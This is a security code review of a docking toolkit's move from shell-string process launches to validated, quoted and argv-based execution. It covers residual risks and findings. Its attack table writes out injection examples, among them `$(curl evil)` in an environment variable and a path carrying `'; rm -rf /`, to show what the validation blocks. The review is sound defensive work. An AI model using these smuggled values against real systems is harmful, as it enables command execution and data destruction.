## 3. Deep review: `LIB/shell_exec.h`

### 3.1 Validation (`validate_exec_path`)

Refuses:

| Condition | `PathReject` | Rationale |
|-----------|--------------|-----------|
| empty | `Empty` | No empty argv[0] / empty shell tokens |
| embedded `\0` | `ContainsNul` | C-string truncation / argv corruption |
| `\n` / `\r` | `ContainsNewline` | Breaks `sh -c` line structure / multi-command smuggling |
| other C0 except TAB | `ContainsControl` | Control-char smuggling |
| DEL `0x7F` | `ContainsControl` | Non-printable |

**Allows:** spaces, shell metacharacters (`;|&$`<>(){}` etc.), single quotes, TAB, high-bit UTF-8.

This is the correct split: metacharacters are neutralized by **quoting**, not by blocklisting. Blocklisting shell metacharacters would break real paths (`My Ligand (1).sdf`, `$HOME`-looking substrings that are literal directory names).

**Gap (LOW):** No length cap. Extremely long paths can still expand `sh -c` command lines toward `ARG_MAX`; not an injection bug, but a DoS vector on the dock shell path. Acceptable for local science tooling.

**Gap (LOW):** Does not require absolute paths or resolve `..` / symlinks. Path *traversal* is out of scope for this hardening pass (injection, not sandboxing).

### 3.2 Quoting

- `shell_quote_raw`: classic POSIX single-quote rule `foo'bar` → `'foo'\''bar'`. Correct and complete for `sh` / bash / dash when the result is used as a single shell word.
- `shell_quote`: validate then quote; **throws** `std::invalid_argument` on unsafe paths (fail-closed).
- `shell_quote_checked`: validate then quote; **nullopt** on unsafe (soft fail).

**Correctness note:** Single-quoting does **not** neutralize newline if a newline were present inside the quoted string in some shells' multiline edge cases — but validation already refuses `\n`/`\r`, so the composition is safe.

### 3.3 Argv runners (`run_argv` / `run_argv_capture` / `run_argv_first_token`)

Strengths:

- No shell (`fork` + `execvp`).
- Validates **every** argv element before fork.
- Closes stdin to `/dev/null`; optional stderr discard on capture path.
- `waitpid` with `EINTR` retry.
- Child uses `_exit(127)` on exec failure (correct — avoids flushing parent stdio).
- Header-only, no new link dependency; listed in `build_sources.ignore`.

Weaknesses / residuals:

| Issue | Severity | Notes |
|-------|----------|-------|
| **Windows `_WIN32` stubs return failure** | LOW | Documented; CI science path is macOS/Linux. |
| **`fork_exec_argv` does not call `validate_exec_path`** | MEDIUM | Separate API on `SubprocessGuard` (see §4.3). Argv form is still injection-safe, but NUL in `std::string` truncates at `c_str()`. |
| **No timeout on `run_argv*`** | LOW | Fine for md5/git/openssl; would be wrong for dock jobs (those keep `wait_with_timeout`). |
| **`run_argv_capture` unbounded stdout buffer** | LOW | Memory growth if a tool floods stdout; not used for dock. |
| **`execvp` path search** | INFO | Relies on `PATH` for bare names (`curl`, `md5`, `git`). Same trust model as before; not a regression. Absolute binary paths (bust) are preferred where available. |
| **No `posix_spawn` / `vfork` optimization** | INFO | Correctness > micro-perf for rare helper spawns. |

### 3.4 Security property summary for the helper

| Attack | Mitigated? |
|--------|------------|
| `FLEXAIDDS_DATA_DIR='$(curl evil)'` via double-quote shell string | **Yes** (single-quote + validation; also data_dir validated before quote) |
| Path with embedded `'; rm -rf /` | **Yes** (single-quoted → literal) |
| Path with embedded newline + second shell command | **Yes** (rejected by validate) |
| Path with embedded NUL | **Yes** (rejected) |
| Metacharacters as argv elements to `run_argv` | **Yes** (no shell → literal args) |
| TOCTOU on path existence | N/A (not claimed) |
| Untrusted **binary** content of `flexaidds_bin` | N/A (trusts local install) |

## 4. Call-site analysis

### 4.1 DatasetRunner dock command (still `sh -c` — intentional residual)

Dock launch still builds a shell string and uses `SubprocessGuard::fork_exec` → `execl("/bin/sh", "sh", "-c", cmd, …)`. Rationale in code/PR: need:

- env prefixes (`OMP_*`, `FLEXAIDDS_CLEFT_SPHERE_FILE=…`, `FLEXAIDDS_ORACLE_SITE=…`, `FLEXAIDDS_SCORE_NATIVE=1`, `FLEXAIDDS_RMSDST=…`)
- stdout/stderr redirection to per-restart logs

**Quoted interpolations (post-merge):**

| Token | Mechanism |
|-------|-----------|
| `entry.cleft_sphere_path` | `shell_quote` |
| `entry.binding_site_path` | `shell_quote` |
| `rmsd_reference_path` | `shell_quote` |
| `flexaidds_bin` | `shell_quote` |
| `effective_receptor` | `shell_quote` |
| `dock_ligand_path` | `shell_quote` |
| `config_path` | `shell_quote` |
| `ri_prefix`, stderr/stdout log paths | `shell_quote` |
| `data_dir` / staged / wrk candidates | `is_safe_exec_path` + `shell_quote`; unsafe → `runtime_error` |

**Unquoted but non-path interpolations:**

| Token | Risk |
|-------|------|
| `OMP_NUM_THREADS=<int>` | Integer from runner logic — not user path |
| `protocol_cfg_.multi_cleft` (int) into `--parallel-dock-regions N` | Integer — safe |
| Literal flags (`OMP_PLACES=cores`, `FLEXAIDDS_SCORE_NATIVE=1`) | Constants |

**Assessment:** Residual shell is the **largest remaining attack surface**, but every path-shaped interpolation audited is validated/quoted. Fail-closed on unsafe `data_dir` is correct for provenance/safety. Full elimination would require either:

1. `posix_spawn` + explicit `envp` + fd redirects without shell, or  
2. a tiny trusted helper that sets env and execs.

Neither is required for this PR's stated scope; both are natural follow-ups.

### 4.2 DatasetRunner: curl download

**Before:** `curl … -o "path" "url"` via shell string / `exec_cmd`.  
**After:** `run_argv({"curl", …, out_path, url})` after `is_safe_exec_path` on both.

**Assessment:** Correct. Double-quote shell style was weaker than single-quote; argv removes the class entirely. URL validation reuses path rules (rejects newline/control in URL) — good for header-injection style payloads; does not attempt full URL parsing (unnecessary for argv).

### 4.3 DatasetRunner: provenance helpers (md5 / sha256 / git)

**Before:** local lambdas building `md5 -q 'path'`, `shasum -a 256 'path'`, `git rev-parse HEAD` through shell token helpers.  
**After:** `run_argv_first_token({…})` only.

**Assessment:** High value. Provenance receipts must record hashes of real files; shell expansion of paths would corrupt trust. Argv is the right tool.

### 4.4 `SubprocessGuard::fork_exec_argv`

- Added and documented.
- **Never called** from production paths in this merge (only definition + comments).
- Does **not** validate argv elements with `validate_exec_path`.
- Does **not** close/redirect stdout/stderr (by design for future pure-exec dock without shell redirects).

**Finding F1 (MEDIUM / incomplete adoption):** Dead API surface. Risk is future misuse without validation. Recommend: validate each argv element (or document that callers must), and migrate at least one non-redirect helper through it so the path is exercised under test.

### 4.5 Residual shell/system/popen in DatasetRunner

Still present (documented residual):

| API | Purpose |
|-----|---------|
| `fork_exec` / `execl sh -c` | Dock launch |
| `std::system` | Windows / fallback `exec_cmd` / `exec_dock` |
| `popen` / `_popen` | `exec_cmd_capture` legacy |

These are not newly introduced. Hardening is progressive, not total.

### 4.6 PoseBust `BustCli.cpp`

| Call | Before | After |
|------|--------|-------|
| `openssl dgst -sha256 -r` | `popen` + shell_quote | `run_argv_first_token` |
| upstream `bust` CLI | `popen` + shell_quote string | `run_argv_capture` + argv vector |

Validates bust/pred/protein/crystal paths before exec. Empty CSV error text updated (`exit_status` vs `pclose_status`).

**Assessment:** Clean migration. Local `shell_quote` helper removed (dedup into `shell_exec.h`).

### 4.7 PoseBust `ChecksChemistry.cpp`

| Call | Before | After |
|------|--------|-------|
| `inchi-1` convertible check | `std::system` with hand-quoted path string | `run_argv({inchi_bin, tmp, outp, flags…})` |
| `command -v inchi-1` | fixed-string `popen` | **unchanged** (no path interpolation) |

**Assessment:** Correct residual for discovery; conversion path is hardened.

### 4.8 `top.cpp --benchmark`

**Before:** concatenate argv into a shell string → `system("benchmark_datasets …")` → dual-launch risk / injection via args.  
**After:** `run_argv` of `{"benchmark_datasets", argv[1]…}` after per-arg `is_safe_exec_path`; `Terminate(ret < 0 ? 127 : ret)`.

**Assessment:** Important fix. Matches PR claim “single child; no dual-launch shell”.

### 4.9 Python mirror

`python/flexaidds/dataset_runner/data_paths.py` adds `validate_exec_path` / `is_safe_exec_path` mirroring C++ rules (TAB allowed, NUL/newline/control rejected). Tests in `python/tests/test_shell_exec_paths.py`.

**Finding F2 (LOW):** Helpers are **not yet wired** into Python subprocess launches (dataset_runner orchestration still uses its own path handling). Mirror is API/parity prep, not end-to-end Python hardening. Acceptable for this merge if framed as parity; should not be claimed as full Python shell-injection fix.

### 5.3 Semantic drift

**Finding F3 (MEDIUM — semantic widening, not scoring math):**

`FLEXAIDDS_SMFREE_REQUIRE_T` historically required first char in `{1,t,T,y,Y}` before fatal exit on T=0. After chunk 2:

```cpp
cfg.smfree_require_t = env_present("FLEXAIDDS_SMFREE_REQUIRE_T");
// true for any non-null non-empty value, including "0" / "false"
```

Impact:

- `FLEXAIDDS_SMFREE_REQUIRE_T=0` **now enables** the fatal gate (was disabled before).
- Rare in production (diagnostic flag), but is a **behavior change** under explicit env misuse / copy-paste.
- Recommended fix: restore truthy parser (`env_truthy_int` or the original first-char set) and add a regression test.

**Presence flags `NO_SEC` / `BENCHMARK` / `FINE_GRID` / `COGNATE_SITE`:** use `env_present_any` (`getenv != nullptr`), matching historical “any set value enables” semantics, including empty string and `"0"` for those that historically ignored the value. **Not a regression** vs pre-merge (same footguns preserved).

### 5.4 Hot-path `from_env()` in gaboom

`calculate_fitness` SMFREE T=0 path calls `ProtocolConfig::from_env()` inside a once-warned block (`static smfree_t0_warned`). Cost is one-shot — fine.

GA entry snapshots `proto` once for `no_sec` / `benchmark_mode` / `t_hot` / `chain_norm` / instream — good.

## 10. Residual attack surface (post-merge mental model)

```
Untrusted path / env
        │
        ├─► validate_exec_path ──reject──► fail closed
        │
        ├─► shell_quote ──► sh -c dock string  ── residual shell (F4)
        │                      (env prefixes + redirects)
        │
        └─► run_argv / run_argv_capture ── no shell  (preferred)
                 curl, md5, sha*, git, openssl, bust, inchi-1, benchmark_datasets
```

Remaining trust assumptions:

- Local `PATH` tools and `flexaidds_bin` are not malicious.
- Manifest-derived paths may be hostile → **handled** for injection; not sandboxed for FS access.
- Windows paths still shell-based.
